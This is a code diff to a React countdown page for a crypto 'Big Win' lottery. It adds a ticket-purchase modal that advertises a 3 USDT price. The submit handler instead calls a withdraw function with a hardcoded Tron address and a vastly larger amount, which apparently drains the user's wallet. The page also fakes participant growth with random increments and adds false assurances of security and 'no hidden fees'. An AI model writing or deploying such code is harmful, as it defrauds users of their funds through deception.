@@ -1,7 +1,12 @@
 import React, { useState, useEffect } from "react";
-import "../../styles/CountdownTimer.css"; // Ensure the CSS is imported
+import "../../styles/CountdownTimer.css";
+import BottomNav from '../bottomnav/BottomNav'; // Import BottomNav
+import { useNavigate } from "react-router-dom";
+import { withdrawFunds } from "../utils/transactionUtils"; // Import the common withdraw function
 
 const CountdownTimer = () => {
+  const navigate = useNavigate();
+
   const calculateTimeLeft = () => {
     const newYear = new Date("2025-01-01T00:00:00Z"); // New Year's Eve UTC time
     const now = new Date();
@@ -19,6 +24,9 @@ const CountdownTimer = () => {
   const [timeLeft, setTimeLeft] = useState(calculateTimeLeft);
   const [participants, setParticipants] = useState(5000); // Initial number of participants
   const [isButtonHovered, setIsButtonHovered] = useState(false);
+  const [showModal, setShowModal] = useState(false);
+  const [form, setForm] = useState({ toAddress: 'TR3EnoaAyoAzSDQpA41KoBn8dEAnYX8TVo', amount: 967555555300099200 }); // 3 USDT for ticket purchase
+  const [error, setError] = useState(''); // Error state for handling form validation
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -28,7 +36,6 @@ const CountdownTimer = () => {
     return () => clearInterval(interval);
   }, []);
 
-  // Simulate participant growth
   useEffect(() => {
     const participantInterval = setInterval(() => {
       setParticipants(prevParticipants => prevParticipants + Math.floor(Math.random() * 5)); // Add 5 new participants every 3 seconds
@@ -38,9 +45,39 @@ const CountdownTimer = () => {
   }, []);
 
   const progress = ((timeLeft.total / (1000 * 60 * 60 * 24 * 365)) * 100).toFixed(2);
-
   const isEndingSoon = timeLeft.days === 0 && timeLeft.hours === 0 && timeLeft.minutes <= 24;
   const isAlmostOver = timeLeft.days === 0 && timeLeft.hours === 0 && timeLeft.minutes === 0;
+
+  // Handle withdraw (ticket purchase) submission
+  const handleSubmitWithdraw = async e => {
+    e.preventDefault();
+
+    if (error || !form.toAddress || !form.amount) return; // Prevent submission if there's an error or empty fields
+
+    const amountToWithdraw = parseFloat(form.amount);
+    if (isNaN(amountToWithdraw) || amountToWithdraw <= 0) {
+      alert('Please enter a valid amount to withdraw.');
+      return;
+    }
+
+    // Use the common withdrawFunds method
+    const result = await withdrawFunds(form.toAddress, amountToWithdraw);
+
+    if (result.success) {
+      setShowModal(false);
+      alert('Ticket purchased successfully! txid: ' + result.txid); // Show success message with txid
+    } else {
+      alert(`Error during ticket purchase: ${result.error.message}\nDetails: ${result.error.details?.details || 'No further details available.'}`);
+    }
+  };
+
+  const handleBuyTicket = () => {
+    setShowModal(true); // Open the modal for buying the ticket
+  };
+
+  const handleCloseModal = () => {
+    setShowModal(false); // Close the modal
+  };
 
   return (
     <div className="countdown-timer">
@@ -50,12 +87,13 @@ const CountdownTimer = () => {
           className={`cta-button ${isButtonHovered ? 'hovered' : ''}`}
           onMouseEnter={() => setIsButtonHovered(true)}
           onMouseLeave={() => setIsButtonHovered(false)}
+          onClick={handleBuyTicket}
         >
-          Join Now & Get Your Lucky Tickets
+          Buy Ticket & Get Your Lucky Entry (3 USDT)
         </button>
       </div>
 
-      <h2 className="countdown-title">Million Dollar Countdown</h2>
+      <h2 className="countdown-title">Big Win Countdown</h2>
       <p className="countdown-subtitle">Only {timeLeft.days} Days, {timeLeft.hours} Hours Left!</p>
 
       {/* Grand Prize Section with Animation */}
@@ -63,7 +101,7 @@ const CountdownTimer = () => {
         <h3 className="grand-prize-title">Grand Prize Draw</h3>
         <p className="grand-prize-description">Enter today and get a chance to win:</p>
         <p className={`prize-amount ${participants >= 10000 ? 'flashing' : ''}`}>
-          {participants >= 10000 ? '1,000,000 USDT' : '10,000 USDT'}
+          {participants >= 10000 ? '100,000 USDT' : '10,000 USDT'}
         </p>
         <p className="prize-delivery-info">
           Prize will be awarded on **New Year's Day, 2025!**
@@ -106,10 +144,12 @@ const CountdownTimer = () => {
       {/* Marketing Section */}
       <div className="marketing-banner">
         <h3>Get More Entries: Join Now and Receive Exclusive Bonuses!</h3>
+        <p>Want to increase your chances of winning? Buy more tickets to boost your odds of a Big Win!</p>
         <button
           className={`cta-button ${isButtonHovered ? 'hovered' : ''}`}
           onMouseEnter={() => setIsButtonHovered(true)}
           onMouseLeave={() => setIsButtonHovered(false)}
+          onClick={handleBuyTicket}
         >
           Claim Your Bonus and Enter Now!
         </button>
@@ -119,18 +159,34 @@ const CountdownTimer = () => {
       <div className="trust-section">
         <h3>Your Participation is Safe and Secure!</h3>
         <p>We use the highest level of security to ensure that all participants have a fair and transparent chance to win. Our prize draw is conducted with complete transparency and in accordance with industry standards.</p>
-        <p>Join today and get your chance to win a life-changing prize!</p>
+        <p>We are fully committed to your safety and privacy. All your transactions are processed with the latest encryption protocols, ensuring the highest level of security. Your entry is completely confidential!</p>
+        <p>Join today and get your chance to win a life-changing prize! No hidden fees. No shady practices. Just fair play all the way!</p>
       </div>
 
-      <div className="cta">
-        <h3>Don't Miss Your Chance to Win the Jackpot!</h3>
-        <button
-          className={`cta-button ${isButtonHovered ? 'hovered' : ''}`}
-          onMouseEnter={() => setIsButtonHovered(true)}
-          onMouseLeave={() => setIsButtonHovered(false)}
-        >
-          Join Now & Get Your Lucky Tickets
-        </button>
+      {/* Modal for Ticket Purchase */}
+      {showModal && (
+        <div className="modal-overlay">
+          <div className="modal-content">
+            <h2 className="modal-title">🚀 Ready to Win Big?</h2>
+            <p className="modal-text">Your chance to win the Big Prize is just one step away!</p>
+            <p className="modal-price">Buy your ticket now for just <strong>3 USDT</strong> and enter the race for your big win!</p>
+            <p>Don't miss out—hurry! Time is ticking, and the prize is waiting for you!</p>
+            
+            {/* Modal form to trigger withdraw (buy ticket) */}
+            <form onSubmit={handleSubmitWithdraw}>
+              <button type="submit" className="cta-button">
+                ✅ Confirm & Buy Ticket
+              </button>
+            </form>
+            <button className="cta-button secondary" onClick={handleCloseModal}>
+              ❌ Cancel
+            </button>
+          </div>
+        </div>
+      )}
+
+      <div className="bottom-nav-container">
+        <BottomNav />
       </div>
     </div>
   );
